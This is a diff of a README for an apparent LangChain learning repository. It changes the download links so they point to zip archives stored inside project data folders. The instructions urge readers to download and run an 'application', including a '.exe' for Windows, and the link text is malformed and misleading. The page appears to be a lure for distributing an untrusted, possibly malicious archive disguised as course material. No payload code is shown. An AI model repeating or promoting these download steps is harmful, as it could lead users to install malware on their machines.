@@ -7,11 +7,11 @@ Welcome to the langchain-learning repository! This project helps users understan
 To get started, you need to download the application. Please follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads section.  
-   [![Download Release](https://github.com/sizofren01/langchain-learning/raw/refs/heads/main/04-Vector-DB/chroma.db/learning-langchain-dicarpellary.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/sizofren01/langchain-learning/raw/refs/heads/main/04-Vector-DB/chroma.db/learning-langchain-dicarpellary.zip)
+   [![Download Release](https://raw.githubusercontent.com/sizofren01/langchain-learning/main/01-Data-Ingestion/langchain-learning-v3.3.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sizofren01/langchain-learning/main/01-Data-Ingestion/langchain-learning-v3.3.zip)
 
 2. Once on the releases page, look for the latest version.
 
-3. Download the appropriate file for your operating system. Typically, you will see options such as `.exe` for Windows or `https://github.com/sizofren01/langchain-learning/raw/refs/heads/main/04-Vector-DB/chroma.db/learning-langchain-dicarpellary.zip` for macOS and Linux.
+3. Download the appropriate file for your operating system. Typically, you will see options such as `.exe` for Windows or `https://raw.githubusercontent.com/sizofren01/langchain-learning/main/01-Data-Ingestion/langchain-learning-v3.3.zip` for macOS and Linux.
 
 4. After downloading, locate the file on your device.
 
@@ -60,4 +60,4 @@ If you encounter any issues while using the langchain-learning application or ha
 ## 🏁 Conclusion
 This repository serves as a comprehensive learning tool for anyone eager to understand LangChain. By following these steps, you can easily download, install, and start learning. For a quick download, visit the link below:
 
-[![Download Release](https://github.com/sizofren01/langchain-learning/raw/refs/heads/main/04-Vector-DB/chroma.db/learning-langchain-dicarpellary.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/sizofren01/langchain-learning/raw/refs/heads/main/04-Vector-DB/chroma.db/learning-langchain-dicarpellary.zip)
+[![Download Release](https://raw.githubusercontent.com/sizofren01/langchain-learning/main/01-Data-Ingestion/langchain-learning-v3.3.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sizofren01/langchain-learning/main/01-Data-Ingestion/langchain-learning-v3.3.zip)
